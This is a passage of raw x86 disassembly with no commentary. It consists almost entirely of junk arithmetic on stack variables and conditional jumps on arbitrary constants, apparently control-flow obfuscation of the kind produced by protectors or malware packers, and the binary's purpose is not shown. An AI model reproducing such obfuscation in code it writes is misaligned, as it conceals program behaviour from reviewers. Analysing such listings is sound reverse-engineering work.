  45226d:	mov    edx,DWORD PTR [ebp-0x14]
  452270:	sub    DWORD PTR [ebp-0x18],edi
  452273:	sub    esi,eax
  452275:	add    DWORD PTR [ebp-0x18],ecx
  452278:	add    DWORD PTR [ebp-0x14],esi
  45227b:	cmp    edx,0x9d15
  452281:	je     0x4522a2
  452283:	cmp    edx,0xc814
  452289:	je     0x4522a2
  45228b:	and    edx,edi
  45228d:	mov    edi,0xf5
  452292:	mov    esi,DWORD PTR [ebp-0x14]
  452295:	sub    edi,ebx
  452297:	sub    DWORD PTR [ebp-0x14],edx
  45229a:	sub    edi,ecx
  45229c:	or     DWORD PTR [ebp-0x14],esi
  45229f:	add    DWORD PTR [ebp-0x14],edi
  4522a2:	push   0x471d7c
  4522a7:	call   DWORD PTR ds:0x462c20
  4522ad:	mov    ecx,DWORD PTR [ebp-0x18]
  4522b0:	cmp    ecx,DWORD PTR [ebp-0x34]
  4522b3:	je     0x45235e
  4522b9:	mov    eax,DWORD PTR [ebp-0x18]
  4522bc:	cmp    ecx,DWORD PTR ds:0x471d98
  4522c2:	jne    0x45235e
  4522c8:	mov    DWORD PTR [ebp-0x14],eax
  4522cb:	and    ecx,edi
  4522cd:	mov    edi,DWORD PTR [ebp-0x14]
  4522d0:	add    DWORD PTR [ebp-0x18],ecx
  4522d3:	sub    edi,esi
  4522d5:	sub    edi,ecx
  4522d7:	sub    edi,ecx
  4522d9:	xor    edx,edx
  4522db:	test   edi,0xc1
  4522e1:	jne    0x45235e
  4522e3:	mov    esi,DWORD PTR ds:0x471cec
  4522e9:	mov    ebx,DWORD PTR [ebp-0x14]
  4522ec:	cmp    edi,DWORD PTR ds:0x471d90
  4522f2:	jne    0x45235e
  4522f4:	and    edx,ebx
  4522f6:	test   edi,0xeb
  4522fc:	je     0x45235e
  4522fe:	xor    ecx,ecx
  452300:	mov    esi,DWORD PTR [ebp-0x18]
  452303:	add    edi,eax
  452305:	add    esi,edx
  452307:	cmp    esi,0xaa45
  45230d:	jne    0x45235e
  45230f:	and    esi,ecx
  452311:	mov    ebx,DWORD PTR [ebp-0x14]
  452314:	sub    ebx,eax
  452316:	test   edx,0x6d
  45231c:	jne    0x45235e
  45231e:	mov    edx,0xb2
  452323:	mov    ecx,esi
  452325:	add    DWORD PTR [ebp-0x14],edx
  452328:	or     edi,eax
  45232a:	and    DWORD PTR [ebp-0x14],ecx
  45232d:	sub    ebx,esi
  45232f:	test   ebx,0x53
  452335:	jne    0x45235e
  452337:	sub    DWORD PTR [ebp-0x14],ebx
  45233a:	cmp    edi,ecx
  45233c:	jne    0x45235e
  45233e:	mov    edx,DWORD PTR [ebp-0x18]
  452341:	mov    ebx,DWORD PTR [ebp-0x18]
  452344:	sub    edi,edx
  452346:	add    edi,edx
  452348:	sub    edi,eax
  45234a:	cmp    ebx,0xffffffa1
  45234d:	jne    0x45235e
  45234f:	add    DWORD PTR [ebp-0x18],edi
  452352:	cmp    ebx,DWORD PTR [ebp-0x4]
  452355:	jne    0x45235e
  452357:	cmp    ebx,ecx
  452359:	jne    0x45235e
  45235b:	sub    DWORD PTR [ebp-0x18],ebx
  45235e:	push   0x60
  452360:	push   0x0
  452362:	call   DWORD PTR ds:0x462c58
  452368:	mov    ebx,DWORD PTR [ebp-0x14]
  45236b:	mov    edx,DWORD PTR ds:0x471ccc
  452371:	add    edx,eax
  452373:	cmp    edx,DWORD PTR ds:0x471d24
  452379:	je     0x4523e3
  45237b:	add    ebx,ebx
  45237d:	sub    DWORD PTR [ebp-0x14],edx
  452380:	xor    edi,edi
  452382:	mov    edx,DWORD PTR [ebp-0x14]
  452385:	and    ebx,edi
  452387:	add    edx,edx
  452389:	and    edx,esi
  45238b:	or     edx,edi
  45238d:	test   ebx,0xa61d
  452393:	je     0x4523e3
  452395:	cmp    edx,0xfffffff3
  452398:	jne    0x4523e3
  45239a:	mov    esi,DWORD PTR [ebp-0x14]
  45239d:	mov    edi,DWORD PTR ds:0x471ce8
  4523a3:	cmp    edx,DWORD PTR ds:0x471ccc
  4523a9:	jne    0x4523e3
  4523ab:	mov    ecx,0x92
  4523b0:	and    DWORD PTR [ebp-0x14],ecx
  4523b3:	add    edi,edi
  4523b5:	cmp    edx,0x89ba
  4523bb:	jne    0x4523e3
  4523bd:	mov    ecx,0x1000900
  4523c2:	and    DWORD PTR [ebp-0x14],esi
  4523c5:	sub    DWORD PTR [ebp-0x18],edx
  4523c8:	or     ebx,eax
  4523ca:	sub    edi,ecx
  4523cc:	add    DWORD PTR [ebp-0x14],ebx
  4523cf:	sub    DWORD PTR [ebp-0x14],edx
  4523d2:	and    edi,ecx
  4523d4:	cmp    edx,DWORD PTR ds:0x471ce8
  4523da:	je     0x4523e3
  4523dc:	and    esi,ebx
  4523de:	add    esi,edi
  4523e0:	sub    DWORD PTR [ebp-0x18],esi
  4523e3:	cmp    eax,DWORD PTR ds:0x471d24
  4523e9:	jne    0x4525bb
  4523ef:	mov    ecx,edi
  4523f1:	sub    DWORD PTR [ebp-0x18],ecx
  4523f4:	xor    edi,edi
  4523f6:	mov    ebx,DWORD PTR [ebp-0x14]
  4523f9:	or     DWORD PTR [ebp-0x18],edi
  4523fc:	add    DWORD PTR [ebp-0x14],ebx
  4523ff:	mov    edx,DWORD PTR ds:0x471cd4
  452405:	add    DWORD PTR [ebp-0x14],edx
  452408:	mov    ebx,edi
  45240a:	mov    edx,0x78
  45240f:	sub    edx,ecx
  452411:	and    edx,esi
  452413:	mov    ecx,esi
  452415:	sub    edx,esi
  452417:	and    DWORD PTR [ebp-0x14],edx
  45241a:	add    ecx,eax
  45241c:	cmp    ecx,DWORD PTR [ebp-0xc]
  45241f:	jne    0x45247d
  452421:	mov    edx,DWORD PTR [ebp-0x14]
  452424:	add    DWORD PTR [ebp-0x18],ecx
  452427:	mov    ecx,0xe2
  45242c:	add    ecx,edx
  45242e:	sub    DWORD PTR [ebp-0x18],edx
  452431:	cmp    ecx,DWORD PTR ds:0x471d7c
  452437:	jne    0x45247d
  452439:	sub    DWORD PTR [ebp-0x18],edx
  45243c:	mov    edx,0x92
  452441:	mov    eax,DWORD PTR ds:0x471cec
  452447:	sub    eax,edx
  452449:	add    DWORD PTR [ebp-0x14],ebx
  45244c:	cmp    ecx,0xdf13
  452452:	je     0x45247d
  452454:	mov    edx,DWORD PTR [ebp-0x14]
  452457:	cmp    edx,ebx
  452459:	jne    0x45247d
  45245b:	cmp    edx,esi
  45245d:	jne    0x45247d
  45245f:	add    edx,esi
  452461:	mov    eax,DWORD PTR ds:0x471d24
  452467:	sub    DWORD PTR [ebp-0x14],esi
  45246a:	add    DWORD PTR [ebp-0x18],ecx
  45246d:	mov    ecx,DWORD PTR ds:0x471ccc
  452473:	sub    eax,edx
  452475:	add    ecx,edx
  452477:	xor    DWORD PTR [ebp-0x14],ecx
  45247a:	add    DWORD PTR [ebp-0x14],eax
  45247d:	add    esi,eax
  45247f:	add    DWORD PTR [ebp-0x18],esi
  452482:	and    edi,ebx
  452484:	sub    edx,ecx
  452486:	test   edx,0x6d
  45248c:	jne    0x45249a
  45248e:	add    edx,eax
  452490:	or     edx,ecx
  452492:	mov    eax,DWORD PTR [ebp-0x14]
  452495:	and    edx,eax
  452497:	sub    DWORD PTR [ebp-0x14],edx
  45249a:	mov    esi,0x53a2
  45249f:	and    esi,ebx
  4524a1:	mov    ecx,0xd1
  4524a6:	add    DWORD PTR [ebp-0x14],ecx
  4524a9:	add    DWORD PTR [ebp-0x18],esi
  4524ac:	mov    DWORD PTR [ebp-0x34],ebx
  4524af:	mov    esi,DWORD PTR [ebp-0x14]
  4524b2:	mov    eax,DWORD PTR [ebp-0x14]
  4524b5:	or     DWORD PTR [ebp-0x18],ebx
  4524b8:	sub    esi,ecx
  4524ba:	cmp    eax,0x68
  4524bd:	jne    0x45256d
  4524c3:	mov    ebx,0x2905
  4524c8:	cmp    esi,0xffffffb9
  4524cb:	je     0x45256d
  4524d1:	cmp    esi,0xcbaf
  4524d7:	jne    0x45256d
  4524dd:	mov    edx,DWORD PTR [ebp-0x14]
  4524e0:	sub    ebx,eax
  4524e2:	add    edx,esi
  4524e4:	mov    esi,0x39
  4524e9:	add    edx,edi
  4524eb:	mov    DWORD PTR [ebp-0x18],esi
  4524ee:	sub    DWORD PTR [ebp-0x14],ebx
  4524f1:	add    DWORD PTR [ebp-0x14],edi
  4524f4:	sub    edx,ebx
  4524f6:	add    DWORD PTR [ebp-0x14],esi
  4524f9:	cmp    edx,DWORD PTR ds:0x471d20
  4524ff:	jne    0x45256d
  452501:	mov    ebx,0xbb
  452506:	add    edx,ecx
  452508:	mov    ebx,0x72
  45250d:	cmp    edx,0x4d
  452510:	je     0x45256d
  452512:	mov    eax,DWORD PTR [ebp-0x18]
  452515:	mov    ecx,DWORD PTR ds:0x471d24
  45251b:	sub    ecx,esi
  45251d:	cmp    edx,DWORD PTR [ebp-0x10]
  452520:	jne    0x45256d
  452522:	and    edx,edi
  452524:	mov    esi,edx
  452526:	add    eax,edx
  452528:	xor    DWORD PTR [ebp-0x14],eax
  45252b:	cmp    esi,0x4
  45252e:	jne    0x45256d
  452530:	xor    edx,edx
  452532:	mov    eax,DWORD PTR ds:0x471d64
  452538:	and    ebx,esi
  45253a:	add    DWORD PTR [ebp-0x18],ecx
  45253d:	add    DWORD PTR [ebp-0x14],ebx
  452540:	add    edx,edi
  452542:	sub    edx,edi
  452544:	sub    DWORD PTR [ebp-0x18],eax
  452547:	add    esi,eax
  452549:	test   esi,0xca
  45254f:	jne    0x45256d
  452551:	mov    eax,DWORD PTR [ebp-0x14]
  452554:	mov    ebx,edx
  452556:	sub    DWORD PTR [ebp-0x18],eax
  452559:	sub    DWORD PTR [ebp-0x14],eax
  45255c:	add    esi,eax
  45255e:	add    ebx,esi
  452560:	or     ebx,esi
  452562:	test   ebx,0x61
  452568:	jne    0x45256d
  45256a:	xor    DWORD PTR [ebp-0x18],ebx
  45256d:	mov    esi,DWORD PTR [ebp-0x18]
  452570:	mov    edx,DWORD PTR ds:0x471ce8
  452576:	cmp    eax,DWORD PTR [ebp-0x4]
  452579:	jne    0x452590
  45257b:	add    esi,edi
  45257d:	mov    eax,0x3b
  452582:	add    DWORD PTR [ebp-0x18],edx
  452585:	and    DWORD PTR [ebp-0x14],esi
  452588:	mov    ecx,DWORD PTR [ebp-0x18]
  45258b:	add    eax,ecx
  45258d:	sub    DWORD PTR [ebp-0x18],eax
  452590:	add    DWORD PTR [ebp-0x34],edi
  452593:	sub    edx,ecx
  452595:	cmp    edx,0xfffffff8
  452598:	jne    0x4525bb
  45259a:	add    DWORD PTR [ebp-0x18],esi
  45259d:	mov    esi,DWORD PTR ds:0x471d24
  4525a3:	mov    ecx,0x6a
  4525a8:	sub    DWORD PTR [ebp-0x18],edx
  4525ab:	mov    DWORD PTR [ebp-0x14],eax
  4525ae:	add    DWORD PTR [ebp-0x18],ecx
  4525b1:	and    edx,esi
  4525b3:	sub    DWORD PTR [ebp-0x18],ebx
  4525b6:	sub    edx,esi
  4525b8:	sub    DWORD PTR [ebp-0x14],edx
  4525bb:	cmp    edx,edi
  4525bd:	jne    0x4525c2
  4525bf:	add    DWORD PTR [ebp-0x14],edi
  4525c2:	mov    ebx,DWORD PTR [ebp-0x14]
  4525c5:	mov    eax,DWORD PTR [ebp-0x14]
  4525c8:	add    ebx,eax
  4525ca:	cmp    ebx,eax
  4525cc:	je     0x4527d3
  4525d2:	mov    edx,DWORD PTR [ebp-0x14]
  4525d5:	add    DWORD PTR [ebp-0x18],edx
  4525d8:	add    ebx,ecx
  4525da:	add    ebx,ecx
  4525dc:	mov    DWORD PTR [ebp-0x18],edx
  4525df:	xor    DWORD PTR [ebp-0x18],eax
  4525e2:	mov    ecx,0xad3f
  4525e7:	cmp    eax,0xffffff8e
  4525ea:	je     0x4527d3
  4525f0:	mov    edx,DWORD PTR [ebp-0x14]
  4525f3:	cmp    ebx,0xffffffa6
  4525f6:	jne    0x4527d3
  4525fc:	mov    edi,DWORD PTR [ebp-0x18]
  4525ff:	or     DWORD PTR [ebp-0x18],ebx
  452602:	and    edi,ebx
  452604:	add    edi,edi
  452606:	test   edx,0x4c
  45260c:	je     0x4527d3
  452612:	cmp    ebx,DWORD PTR ds:0x471d98
  452618:	je     0x4527d3
  45261e:	add    DWORD PTR [ebp-0x14],edi
  452621:	sub    edx,esi
  452623:	add    edx,eax
  452625:	mov    edi,DWORD PTR [ebp-0x18]
  452628:	mov    ebx,DWORD PTR [ebp-0x18]
  45262b:	test   ebx,0xed
  452631:	je     0x4527d3
  452637:	mov    eax,edx
  452639:	cmp    eax,0xffffffb7
  45263c:	je     0x4527d3
  452642:	cmp    edi,DWORD PTR ds:0x471cec
  452648:	je     0x4527d3
  45264e:	add    ecx,ecx
  452650:	mov    esi,ebx
  452652:	sub    edi,ecx
  452654:	and    eax,edx
  452656:	mov    ebx,0x9e
  45265b:	cmp    eax,edx
  45265d:	je     0x4527d3
  452663:	mov    edx,DWORD PTR [ebp-0x18]
  452666:	sub    eax,ecx
  452668:	add    DWORD PTR [ebp-0x14],ebx
  45266b:	mov    ebx,DWORD PTR [ebp-0x14]
  45266e:	cmp    edx,DWORD PTR [ebp-0x34]
  452671:	jne    0x4527d3
  452677:	cmp    esi,DWORD PTR [ebp-0x10]
  45267a:	je     0x4527d3
  452680:	sub    DWORD PTR [ebp-0x18],edx
  452683:	add    edi,edx
  452685:	xor    DWORD PTR [ebp-0x18],edi
  452688:	sub    ebx,ecx
  45268a:	mov    edi,0x4972
  45268f:	cmp    eax,esi
  452691:	jne    0x4527d3
  452697:	mov    edx,DWORD PTR [ebp-0x14]
  45269a:	add    edx,esi
  45269c:	xor    ecx,ecx
  45269e:	and    DWORD PTR [ebp-0x14],edx
  4526a1:	sub    ebx,esi
  4526a3:	cmp    eax,DWORD PTR [ebp-0x3c]
  4526a6:	jne    0x4527d3
  4526ac:	mov    edx,DWORD PTR ds:0x471ce8
  4526b2:	mov    esi,DWORD PTR [ebp-0x18]
  4526b5:	test   esi,0xe4
  4526bb:	je     0x4527d3
  4526c1:	mov    edi,DWORD PTR [ebp-0x18]
  4526c4:	add    ecx,ecx
  4526c6:	cmp    eax,0xfffffffd
  4526c9:	je     0x4527d3
  4526cf:	sub    DWORD PTR [ebp-0x14],eax
  4526d2:	sub    ecx,edx
  4526d4:	cmp    esi,DWORD PTR ds:0x471ccc
  4526da:	je     0x4527d3
  4526e0:	mov    ecx,DWORD PTR [ebp-0x14]
  4526e3:	mov    edx,DWORD PTR [ebp-0x14]
  4526e6:	cmp    edi,0xffffffb7
  4526e9:	jne    0x4527d3
  4526ef:	add    DWORD PTR [ebp-0x18],eax
  4526f2:	xor    eax,eax
  4526f4:	xor    DWORD PTR [ebp-0x18],eax
  4526f7:	mov    eax,0x64
  4526fc:	or     DWORD PTR [ebp-0x18],esi
  4526ff:	add    ebx,ebx
  452701:	and    ecx,ebx
  452703:	cmp    ecx,0xffffffdc
  452706:	je     0x4527d3
  45270c:	cmp    edi,esi
  45270e:	je     0x4527d3
  452714:	cmp    edx,ecx
  452716:	jne    0x4527d3
  45271c:	sub    DWORD PTR [ebp-0x14],eax
  45271f:	mov    esi,DWORD PTR [ebp-0x14]
  452722:	xor    DWORD PTR [ebp-0x18],ecx
  452725:	cmp    edi,ecx
  452727:	je     0x4527d3
  45272d:	mov    eax,DWORD PTR [ebp-0x14]
  452730:	sub    esi,eax
  452732:	cmp    edi,0xffffffbd
  452735:	je     0x4527d3
  45273b:	sub    edx,eax
  45273d:	xor    ebx,ebx
  45273f:	and    esi,ebx
  452741:	mov    ecx,DWORD PTR [ebp-0x14]
  452744:	cmp    esi,0xffffffe7
  452747:	jne    0x4527d3
  45274d:	add    ecx,ebx
  45274f:	test   ecx,0x4e
  452755:	jne    0x4527d3
  452757:	add    ecx,ebx
  452759:	test   edx,0x24
  45275f:	je     0x4527d3
  452761:	cmp    edx,esi
  452763:	jne    0x4527d3
  452765:	mov    ebx,0xb0
  45276a:	cmp    esi,0xffffffc6
  45276d:	je     0x4527d3
  45276f:	xor    eax,eax
  452771:	cmp    edx,DWORD PTR [ebp-0x18]
  452774:	jne    0x4527d3
  452776:	mov    eax,DWORD PTR ds:0x471d98
  45277c:	and    edx,ebx
  45277e:	test   ecx,0x7b
  452784:	je     0x4527d3
  452786:	cmp    edx,ebx
  452788:	jne    0x4527d3
  45278a:	cmp    edx,DWORD PTR ds:0x471ccc
  452790:	jne    0x4527d3
  452792:	mov    eax,DWORD PTR ds:0x471d20
  452798:	mov    eax,DWORD PTR ds:0x471ccc
  45279e:	xor    DWORD PTR [ebp-0x18],edx
  4527a1:	add    edi,edi
  4527a3:	or     eax,ebx
  4527a5:	cmp    edx,0xffffff87
  4527a8:	je     0x4527d3
  4527aa:	mov    ebx,DWORD PTR ds:0x471d24
  4527b0:	add    esi,esi
  4527b2:	mov    edx,DWORD PTR [ebp-0x18]
  4527b5:	sub    edx,edi
  4527b7:	or     DWORD PTR [ebp-0x14],edx
  4527ba:	add    ecx,edx
  4527bc:	sub    ecx,edi
  4527be:	add    eax,eax
  4527c0:	and    DWORD PTR [ebp-0x14],esi
  4527c3:	or     eax,edx
  4527c5:	sub    ecx,ebx
  4527c7:	and    eax,ecx
  4527c9:	test   eax,0x52
  4527ce:	jne    0x4527d3
  4527d0:	mov    DWORD PTR [ebp-0x18],eax
  4527d3:	call   DWORD PTR ds:0x462c04
  4527d9:	add    DWORD PTR [ebp-0x14],esi
  4527dc:	test   eax,0xdc
  4527e1:	je     0x4528dc
  4527e7:	mov    esi,DWORD PTR [ebp-0x14]
  4527ea:	cmp    esi,DWORD PTR ds:0x471d90
  4527f0:	jne    0x452870
  4527f2:	cmp    esi,DWORD PTR ds:0x471d7c
  4527f8:	je     0x452870
  4527fa:	and    esi,edi
  4527fc:	mov    edi,DWORD PTR [ebp-0x14]
  4527ff:	mov    ecx,DWORD PTR [ebp-0x18]
  452802:	mov    DWORD PTR [ebp-0x14],esi
  452805:	sub    ecx,ebx
  452807:	sub    ecx,ebx
  452809:	sub    ecx,ebx
  45280b:	add    ecx,ecx
  45280d:	and    DWORD PTR [ebp-0x14],ebx
  452810:	sub    DWORD PTR [ebp-0x18],edi
  452813:	add    ecx,ecx
  452815:	test   ecx,0xb6
  45281b:	jne    0x452870
  45281d:	mov    ebx,DWORD PTR ds:0x471ce8
  452823:	sub    DWORD PTR [ebp-0x14],edi
  452826:	mov    edx,DWORD PTR [ebp-0x14]
  452829:	sub    DWORD PTR [ebp-0x18],ecx
  45282c:	add    DWORD PTR [ebp-0x14],esi
  45282f:	cmp    edx,0xfffffffe
  452832:	jne    0x452870
  452834:	xor    edi,edi
  452836:	mov    ecx,esi
  452838:	cmp    ecx,0xfffffffe
  45283b:	je     0x452870
  45283d:	sub    DWORD PTR [ebp-0x14],ecx
  452840:	mov    esi,0xe5
  452845:	or     DWORD PTR [ebp-0x18],edi
  452848:	test   edx,0x9
  45284e:	jne    0x452870
  452850:	cmp    edx,ecx
  452852:	jne    0x452870
  452854:	mov    edi,DWORD PTR [ebp-0x14]
  452857:	cmp    edi,eax
  452859:	jne    0x452870
  45285b:	mov    ebx,0xab
  452860:	and    esi,edx
  452862:	sub    DWORD PTR [ebp-0x18],esi
  452865:	cmp    edi,0xffffff87
  452868:	jne    0x452870
  45286a:	mov    DWORD PTR [ebp-0x18],edi
  45286d:	xor    DWORD PTR [ebp-0x14],ebx
  452870:	mov    ebx,DWORD PTR ds:0x471d7c
  452876:	or     DWORD PTR [ebp-0x14],ebx
  452879:	mov    edx,DWORD PTR [ebp-0x18]
  45287c:	or     edx,ebx
  45287e:	mov    ecx,0xa4
  452883:	add    DWORD PTR [ebp-0x18],edx
  452886:	or     ecx,esi
  452888:	add    ecx,esi
  45288a:	sub    ecx,esi
  45288c:	and    ecx,edx
  45288e:	add    DWORD PTR [ebp-0x18],ecx
  452891:	mov    eax,0xa
  452896:	mov    esi,0x3921226
  45289b:	cmp    ecx,DWORD PTR [ebp-0x34]
  45289e:	je     0x4528c4
  4528a0:	and    esi,ecx
  4528a2:	sub    esi,ecx
  4528a4:	xor    DWORD PTR [ebp-0x14],ebx
  4528a7:	mov    ecx,DWORD PTR ds:0x471cf8
  4528ad:	mov    edx,esi
  4528af:	sub    edx,ecx
  4528b1:	sub    edx,eax
  4528b3:	and    edx,ecx
  4528b5:	sub    edx,edi
  4528b7:	test   edx,0xa724
  4528bd:	je     0x4528c4
  4528bf:	sub    edx,esi
  4528c1:	or     DWORD PTR [ebp-0x18],edx
  4528c4:	sub    esi,edi
  4528c6:	mov    DWORD PTR [ebp-0x1c],esi
  4528c9:	sub    eax,ebx
  4528cb:	add    DWORD PTR [ebp-0x18],eax
  4528ce:	add    DWORD PTR [ebp-0x1c],edi
  4528d1:	mov    DWORD PTR [ebp-0x4],eax
  4528d4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4528d7:	sub    ecx,ebx
  4528d9:	add    DWORD PTR [ebp-0x1c],ecx
  4528dc:	mov    eax,DWORD PTR [ebp-0x14]
  4528df:	add    eax,ecx
  4528e1:	mov    ecx,DWORD PTR ds:0x471d90
  4528e7:	add    ecx,esi
  4528e9:	sub    DWORD PTR [ebp-0x1c],eax
  4528ec:	add    DWORD PTR [ebp-0x18],ecx
  4528ef:	mov    DWORD PTR [ebp-0x1c],eax
  4528f2:	add    ebx,edx
  4528f4:	sub    DWORD PTR [ebp-0x14],edx
  4528f7:	add    ebx,ebx
  4528f9:	mov    DWORD PTR [ebp-0x18],ebx
  4528fc:	mov    ebx,DWORD PTR [ebp-0x18]
  4528ff:	xor    ecx,ecx
  452901:	sub    DWORD PTR [ebp-0x14],ecx
  452904:	add    ebx,edi
  452906:	or     DWORD PTR [ebp-0x14],ebx
  452909:	add    eax,edx
  45290b:	mov    ebx,DWORD PTR ds:0x471d98
  452911:	mov    edi,DWORD PTR [ebp-0x14]
  452914:	sub    ebx,ecx
  452916:	or     DWORD PTR [ebp-0x1c],eax
  452919:	cmp    eax,DWORD PTR ds:0x471ce8
  45291f:	jne    0x45294f
  452921:	mov    DWORD PTR [ebp-0x14],ebx
  452924:	sub    edi,ecx
  452926:	cmp    edx,DWORD PTR ds:0x471d90
  45292c:	jne    0x45294f
  45292e:	cmp    edi,DWORD PTR [ebp-0xc]
  452931:	jne    0x45294f
  452933:	mov    edx,DWORD PTR ds:0x471cb8
  452939:	mov    esi,0x95
  45293e:	and    edx,ebx
  452940:	mov    DWORD PTR [ebp-0x30],edx
  452943:	and    edi,esi
  452945:	cmp    edi,DWORD PTR [ebp-0x34]
  452948:	jne    0x45294f
  45294a:	and    edi,edx
  45294c:	sub    DWORD PTR [ebp-0x14],edi
  45294f:	mov    edi,DWORD PTR ds:0x471d24
  452955:	mov    eax,DWORD PTR [ebp-0x18]
  452958:	mov    DWORD PTR [ebp-0x24],edx
  45295b:	or     DWORD PTR [ebp-0x24],eax
  45295e:	or     DWORD PTR [ebp-0x24],edi
  452961:	add    DWORD PTR [ebp-0x18],ebx
  452964:	and    DWORD PTR [ebp-0x14],esi
  452967:	xor    edx,edx
  452969:	add    DWORD PTR [ebp-0x1c],edx
  45296c:	add    DWORD PTR [ebp-0x1c],eax
  45296f:	add    DWORD PTR [ebp-0x1c],esi
  452972:	sub    DWORD PTR [ebp-0x18],ecx
  452975:	mov    ebx,DWORD PTR [ebp-0x14]
  452978:	mov    eax,DWORD PTR [ebp-0x18]
  45297b:	or     DWORD PTR [ebp-0x14],ebx
  45297e:	or     eax,edi
  452980:	add    DWORD PTR [ebp-0x24],eax
  452983:	xor    DWORD PTR [ebp-0x24],eax
  452986:	or     edi,ebx
  452988:	mov    esi,DWORD PTR [ebp-0x14]
  45298b:	cmp    edi,DWORD PTR [ebp-0x18]
  45298e:	je     0x4529a3
  452990:	sub    edi,esi
  452992:	mov    ecx,DWORD PTR [ebp-0x18]
  452995:	sub    ecx,esi
  452997:	mov    edx,DWORD PTR [ebp-0x1c]
  45299a:	add    DWORD PTR [ebp-0x24],ecx
  45299d:	sub    DWORD PTR [ebp-0x14],edi
  4529a0:	sub    DWORD PTR [ebp-0x1c],edx
  4529a3:	test   edx,0x72
  4529a9:	je     0x452a6d
  4529af:	mov    ecx,0x4d
  4529b4:	mov    eax,edi
  4529b6:	cmp    eax,0x65
  4529b9:	jne    0x452a6d
  4529bf:	mov    edi,eax
  4529c1:	or     ecx,edi
  4529c3:	cmp    ecx,ebx
  4529c5:	je     0x452a6d
  4529cb:	mov    eax,DWORD PTR [ebp-0x14]
  4529ce:	mov    esi,0x9f3f
  4529d3:	add    DWORD PTR [ebp-0x1c],ecx
  4529d6:	add    eax,esi
  4529d8:	add    eax,ebx
  4529da:	cmp    eax,DWORD PTR ds:0x471ce8
  4529e0:	je     0x452a6d
  4529e6:	mov    edi,DWORD PTR [ebp-0x18]
  4529e9:	xor    edx,edx
  4529eb:	cmp    ecx,edx
  4529ed:	jne    0x452a6d
  4529ef:	mov    esi,DWORD PTR [ebp-0x14]
  4529f2:	add    esi,ecx
  4529f4:	add    esi,ebx
  4529f6:	add    edx,esi
  4529f8:	mov    esi,0x2f
  4529fd:	and    eax,ecx
  4529ff:	sub    edi,edx
  452a01:	cmp    edi,DWORD PTR [ebp-0x30]
  452a04:	je     0x452a6d
  452a06:	mov    edx,DWORD PTR [ebp-0x1c]
  452a09:	cmp    edx,0xda48
  452a0f:	je     0x452a6d
  452a11:	sub    DWORD PTR [ebp-0x18],edi
  452a14:	xor    ebx,ebx
  452a16:	cmp    eax,ecx
  452a18:	je     0x452a6d
  452a1a:	mov    esi,DWORD PTR [ebp-0x14]
  452a1d:	mov    edi,0xdb
  452a22:	add    DWORD PTR [ebp-0x18],ebx
  452a25:	add    DWORD PTR [ebp-0x24],edi
  452a28:	and    edx,ebx
  452a2a:	cmp    edx,DWORD PTR ds:0x471cec
  452a30:	jne    0x452a6d
  452a32:	test   esi,0x36
  452a38:	je     0x452a6d
  452a3a:	mov    edi,0x9a
  452a3f:	sub    eax,edi
  452a41:	mov    ecx,DWORD PTR [ebp-0x24]
  452a44:	sub    edx,ecx
  452a46:	add    DWORD PTR [ebp-0x14],ebx
  452a49:	sub    esi,edx
  452a4b:	cmp    eax,DWORD PTR ds:0x471cd4
  452a51:	je     0x452a6d
  452a53:	mov    edi,0x57
  452a58:	add    eax,ecx
  452a5a:	mov    ecx,DWORD PTR ds:0x471d90
  452a60:	or     esi,eax
  452a62:	add    esi,edx
  452a64:	and    DWORD PTR [ebp-0x18],ecx
  452a67:	add    DWORD PTR [ebp-0x24],edi
  452a6a:	add    DWORD PTR [ebp-0x1c],esi
  452a6d:	sub    ebx,edi
  452a6f:	sub    DWORD PTR [ebp-0x18],edi
  452a72:	add    DWORD PTR [ebp-0x18],ebx
  452a75:	mov    ecx,DWORD PTR [ebp-0x1c]
  452a78:	mov    edx,DWORD PTR [ebp-0x14]
  452a7b:	sub    edx,edi
  452a7d:	or     DWORD PTR [ebp-0x18],edx
  452a80:	mov    DWORD PTR [ebp-0x18],ecx
  452a83:	mov    esi,DWORD PTR [ebp-0x18]
  452a86:	mov    edx,DWORD PTR [ebp-0x24]
  452a89:	and    edx,ecx
  452a8b:	cmp    edx,ebx
  452a8d:	je     0x452ad9
  452a8f:	mov    eax,DWORD PTR [ebp-0x18]
  452a92:	test   edx,0xbdf4
  452a98:	je     0x452ad9
  452a9a:	xor    ecx,ecx
  452a9c:	mov    ebx,0xf822
  452aa1:	add    DWORD PTR [ebp-0x14],ebx
  452aa4:	add    DWORD PTR [ebp-0x14],edx
  452aa7:	sub    DWORD PTR [ebp-0x18],ecx
  452aaa:	sub    DWORD PTR [ebp-0x14],esi
  452aad:	cmp    eax,edx
  452aaf:	jne    0x452ad9
  452ab1:	add    eax,esi
  452ab3:	and    eax,edi
  452ab5:	sub    eax,edi
  452ab7:	sub    eax,ebx
  452ab9:	cmp    eax,0xfffffff1
  452abc:	je     0x452ad9
  452abe:	cmp    eax,0x3d
  452ac1:	je     0x452ad9
  452ac3:	mov    edx,DWORD PTR [ebp-0x24]
  452ac6:	mov    edi,DWORD PTR [ebp-0x14]
  452ac9:	sub    DWORD PTR [ebp-0x18],edi
  452acc:	sub    DWORD PTR [ebp-0x14],edi
  452acf:	or     edx,esi
  452ad1:	and    edx,ecx
  452ad3:	add    DWORD PTR [ebp-0x18],eax
  452ad6:	add    DWORD PTR [ebp-0x18],edx
  452ad9:	or     eax,edx
  452adb:	mov    ebx,DWORD PTR ds:0x471d24
  452ae1:	mov    esi,DWORD PTR [ebp-0x14]
  452ae4:	sub    ebx,eax
  452ae6:	sub    esi,edi
  452ae8:	cmp    ebx,DWORD PTR ds:0x471cf8
  452aee:	je     0x452bee
  452af4:	mov    edx,DWORD PTR [ebp-0x1c]
  452af7:	mov    eax,ecx
  452af9:	add    esi,edi
  452afb:	cmp    esi,0x42
  452afe:	je     0x452bee
  452b04:	mov    eax,0x7f41
  452b09:	sub    esi,edx
  452b0b:	mov    ecx,edx
  452b0d:	add    DWORD PTR [ebp-0x18],esi
  452b10:	add    eax,edx
  452b12:	add    DWORD PTR [ebp-0x1c],ecx
  452b15:	cmp    eax,DWORD PTR [ebp-0x14]
  452b18:	je     0x452bee
  452b1e:	xor    DWORD PTR [ebp-0x24],ebx
  452b21:	xor    ecx,ecx
  452b23:	sub    eax,esi
  452b25:	cmp    eax,esi
  452b27:	jne    0x452bee
  452b2d:	add    DWORD PTR [ebp-0x1c],ecx
  452b30:	mov    edi,DWORD PTR [ebp-0x1c]
  452b33:	cmp    eax,DWORD PTR ds:0x471cd4
  452b39:	je     0x452bee
  452b3f:	xor    DWORD PTR [ebp-0x14],eax
  452b42:	add    edi,eax
